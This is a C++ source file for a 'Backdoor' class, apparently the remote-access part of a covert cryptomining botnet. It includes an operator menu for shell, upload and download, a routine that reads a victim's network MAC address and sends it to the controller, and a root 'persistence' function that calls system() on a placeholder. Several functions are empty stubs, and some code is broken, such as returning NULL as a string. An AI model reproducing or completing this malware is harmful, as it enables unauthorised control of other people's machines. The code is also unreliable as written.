#include "backdoor.h"

/*
    Socket codes:
        1 - shell
        2 - upload
        3 - download
        4 - MinerInfo
*/


void Backdoor::shell(){
    if(this->is_server){

    }else{

    }
}


void Backdoor::upload(const char * path){
    if(this->is_server){

    }else{

    }
}


void Backdoor::download(const char *path){
    if(this->is_server){

    }else{

    }
}


std::string Backdoor::get_miner_id(){
    if(this->is_server){
        std::string miner_info;
        this->c->send_message(this->sock, "4");
        return this->c->recv_message(this->sock);
    
    }else{
        
        char wlan0[20], eth0[20];
        FILE * f, *g; 
        f = fopen("/sys/class/net/wlan0/address", "r");
        if(f != NULL){
            fscanf(f, "%s", wlan0);
            fclose(f);
            c->send_message(this->sock, wlan0);
            return NULL;

        }else{
            g = fopen("/sys/class/net/eth0/address", "r");
            if(g != NULL){
                fscanf(g, "%s", eth0);
                fclose(g);
                c->send_message(this->sock, eth0);
                return NULL;
            }
        }
    }
}


std::string Backdoor::get_miner_ip(){
    return  std::string(this->client_ip);
}


void Backdoor::menu(){
    int choice;
    std::cout << "MINER_ID = " << this->miner_id << " - IP = \n" << this->client_ip << std::endl;

    std::cout << "Operações : " << std::endl;

    std::cout << "1) Shell\n2) Download\n3)Upload\n" << std::endl;

    choice = std::cin.get();


    if(choice == 1){
        this->shell();
    
    }else if(choice == 2){
        std::string path;
        std::cout << "Path: ";
        std::getline(std::cin, path);
         // Get path

        this->download(path.c_str());

    }else if(choice == 3){
        std::string path;
        std::cout << "Path: ";
        std::getline(std::cin, path);
        this->upload(path.c_str());
    
    }else{
        std::cout << "Comando inválido" << std::endl;
    }
}


Backdoor::Backdoor(int sock, Communication *c, bool is_server, char *ip){
    this->sock = sock;
    this->c  = c;
    this->is_server = is_server;
    this->client_ip = ip;

    if(is_server){
        //menu();
    }
}

void Backdoor::persistence(){
    const char *  path = "1231231";
    std::cout << "Running persistence" << std::endl;
    if(geteuid() != 0)
    {
        std::cout << "Not root";

    }else{
        std::cout << "root";
        system(path);
    }
}